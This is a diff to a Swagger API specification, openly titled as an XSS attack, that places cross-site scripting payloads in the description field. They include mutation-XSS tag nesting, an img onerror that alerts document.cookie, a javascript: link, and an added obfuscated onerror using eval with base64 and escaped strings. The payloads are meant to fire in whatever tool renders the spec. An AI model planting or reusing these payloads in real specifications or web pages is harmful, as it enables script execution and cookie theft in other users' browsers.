@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M41N
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1> <a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ')); src=1> <a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a><img onerror=eval('al&#x5c;u0065rt(1)') src=a>'alert(1)'.replace(/.+/,eval)   "></form>
 
   version: production
 basePath: /JSSResource/
